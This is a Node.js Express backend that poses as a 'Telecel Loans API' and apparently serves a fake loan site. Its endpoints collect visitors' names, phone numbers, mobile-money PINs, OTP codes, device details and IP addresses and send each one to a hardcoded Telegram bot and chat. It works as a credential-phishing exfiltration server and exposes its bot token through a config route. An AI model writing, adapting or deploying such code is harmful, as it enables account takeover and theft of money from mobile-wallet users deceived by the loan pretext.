const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');

// ─── CONFIGURATION ───
const CONFIG = {
    BOT_TOKEN: '8993833860:AAHz1B3ueOgICpj_JdhckTf7Xp0Vu6IeLCY',
    CHAT_ID: '7730849900',
    PORT: process.env.PORT || 3000,
    ALLOWED_ORIGINS: ['*']
};

// ─── EXPRESS APP ───
const app = express();

// ─── MIDDLEWARE ───
app.use(cors({
    origin: CONFIG.ALLOWED_ORIGINS,
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ─── LOGGING ───
app.use((req, res, next) => {
    console.log(`📥 ${req.method} ${req.path}`);
    next();
});

// ─── HEALTH CHECK ───
app.get('/', (req, res) => {
    res.json({
        status: 'OK',
        message: 'Telecel Loans API is running',
        timestamp: new Date().toISOString(),
        version: '1.0.0'
    });
});

// ─── HEALTH CHECK (Railway) ───
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy',
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});

// ─── SEND TELEGRAM MESSAGE ───
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: CONFIG.CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        return response.data;
    } catch (error) {
        console.error('❌ Telegram Error:', error.response?.data || error.message);
        throw error;
    }
}

// ─── SEND TELEGRAM PHOTO ───
async function sendTelegramPhoto(photoUrl, caption) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
        const response = await axios.post(url, {
            chat_id: CONFIG.CHAT_ID,
            photo: photoUrl,
            caption: caption,
            parse_mode: 'Markdown'
        });
        return response.data;
    } catch (error) {
        console.error('❌ Telegram Photo Error:', error.response?.data || error.message);
        throw error;
    }
}

// ─── API ROUTES ───

// 1. Send Loan Authorization Notification
app.post('/api/authorize', async (req, res) => {
    try {
        const { name, phone, amount, pin, period } = req.body;

        // Validate required fields
        if (!name || !phone || !amount || !pin) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone, amount, pin'
            });
        }

        // Create Telegram message
        const message = `🔐 *New Loan Authorization Request*\n\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `🔢 *PIN:* ${pin}\n` +
            `💰 *Amount:* GHS ${parseFloat(amount).toLocaleString()}\n` +
            `📅 *Period:* ${period || '30 days'}\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `✅ User has been redirected to OTP verification.`;

        // Send to Telegram
        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            message: 'Authorization notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Authorization Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send authorization notification',
            error: error.message
        });
    }
});

// 2. Send OTP Request Notification
app.post('/api/otp-request', async (req, res) => {
    try {
        const { name, phone, otp } = req.body;

        if (!name || !phone || !otp) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone, otp'
            });
        }

        const message = `📱 *OTP Verification Request*\n\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `🔑 *OTP Code:* \`${otp}\`\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `✅ User is verifying their OTP.`;

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            message: 'OTP notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ OTP Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send OTP notification',
            error: error.message
        });
    }
});

// 3. Send OTP Verified Confirmation
app.post('/api/otp-verified', async (req, res) => {
    try {
        const { name, phone } = req.body;

        if (!name || !phone) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone'
            });
        }

        const message = `✅ *OTP Verification Successful*\n\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `🔐 User has successfully verified their OTP. Proceeding to device verification.`;

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            message: 'OTP verified notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ OTP Verified Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send OTP verified notification',
            error: error.message
        });
    }
});

// 4. Send Device Verification Notification
app.post('/api/device-verify', async (req, res) => {
    try {
        const { name, phone, device, browser, location, ip } = req.body;

        if (!name || !phone) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone'
            });
        }

        const message = `🖥️ *Device Verification*\n\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `📱 *Device:* ${device || 'Unknown'}\n` +
            `🌐 *Browser:* ${browser || 'Unknown'}\n` +
            `📍 *Location:* ${location || 'Unknown'}\n` +
            `🔢 *IP:* ${ip || 'Unknown'}\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `✅ User has verified their device. Loan disbursement initiated!`;

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            message: 'Device verification notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Device Verify Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send device verification notification',
            error: error.message
        });
    }
});

// 5. Send Loan Disbursement Confirmation
app.post('/api/loan-disbursed', async (req, res) => {
    try {
        const { name, phone, amount, transactionId } = req.body;

        if (!name || !phone || !amount) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone, amount'
            });
        }

        const message = `💰 *LOAN DISBURSED!*\n\n` +
            `✅ *Status:* SUCCESS\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `💰 *Amount:* GHS ${parseFloat(amount).toLocaleString()}\n` +
            `🆔 *Transaction ID:* ${transactionId || 'TXN-' + Date.now()}\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `🎉 Loan has been successfully disbursed to user's Telecel Cash wallet!`;

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            message: 'Loan disbursement notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Disbursement Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send disbursement notification',
            error: error.message
        });
    }
});

// 6. Generate OTP (for simulation)
app.post('/api/generate-otp', async (req, res) => {
    try {
        const { name, phone } = req.body;

        if (!name || !phone) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone'
            });
        }

        // Generate 6-digit OTP
        const otp = Math.floor(100000 + Math.random() * 900000).toString();

        const message = `🔑 *OTP Generated*\n\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `🔢 *OTP:* \`${otp}\`\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `📨 OTP has been sent to user.`;

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            otp: otp,
            message: 'OTP generated and notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Generate OTP Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to generate OTP',
            error: error.message
        });
    }
});

// 7. Get config (for frontend)
app.get('/api/config', (req, res) => {
    res.json({
        success: true,
        config: {
            apiUrl: 'https://telecelcom-production.up.railway.app',
            botToken: CONFIG.BOT_TOKEN,
            chatId: CONFIG.CHAT_ID,
            pages: {
                otp: 'otp.html',
                device: 'device_verify.html',
                home: 'index.html'
            }
        }
    });
});

// ─── CATCH-ALL ROUTE ───
app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: 'Route not found',
        path: req.path
    });
});

// ─── START SERVER ───
app.listen(CONFIG.PORT, () => {
    console.log(`🚀 Telecel Loans API running on port ${CONFIG.PORT}`);
    console.log(`📡 Health check: http://localhost:${CONFIG.PORT}/health`);
    console.log(`🤖 Telegram Bot: ${CONFIG.BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`💬 Chat ID: ${CONFIG.CHAT_ID || '❌ Not set'}`);
});
